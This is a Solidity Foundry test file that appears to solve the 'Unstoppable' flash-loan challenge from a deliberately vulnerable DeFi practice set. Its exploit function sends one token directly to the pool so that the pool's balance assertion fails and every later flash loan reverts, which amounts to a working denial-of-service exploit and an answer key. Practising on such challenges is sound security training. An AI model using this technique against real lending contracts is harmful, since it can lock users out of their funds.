// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {stdError} from "forge-std/Test.sol";
import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";
import "../../unstoppable/UnstoppableLender.sol";
import "../../unstoppable/ReceiverUnstoppable.sol";
import "../../DamnValuableToken.sol";

contract UnstoppableTest is BaseTest {

    uint TOKENS_IN_POOL = 1000000 ether;
    uint INITIAL_ATTACKER_TOKEN_BALANCE = 100 ether;

    DamnValuableToken token;
    UnstoppableLender pool;
    ReceiverUnstoppable receiver;

    // attacker adddress
    address payable attacker;
    address payable someUser;

    constructor() {
        // setup the needed user accordly
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";
        labels[1] = "Some User";
        preSetup(2, labels);
    }

    function setUp() public override {
        super.setUp();
        attacker = users[0];
        someUser = users[1];

        // Setup the contracts
        token = new DamnValuableToken();
        pool = new UnstoppableLender(address(token));

        // Setup the tokens for the pool and the attacker
        token.approve(address(pool), TOKENS_IN_POOL);
        pool.depositTokens(TOKENS_IN_POOL);
        token.transfer(address(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        // Initialize the Receiver and do a flashloan
        vm.startPrank(someUser);
        receiver = new ReceiverUnstoppable(address(pool));
        receiver.executeFlashLoan(10);
        vm.stopPrank();
    }


    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */
        // Transfer one token to the pool as the attacker account
        vm.prank(attacker);
        token.transfer(address(pool), 1);
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */
        // The pool is unbalance after the transfer of 1 token from the attacker
        // It is no longer possible to execute the flash loans
        vm.expectRevert(stdError.assertionError);
        vm.prank(someUser);
        receiver.executeFlashLoan(10);
    }
}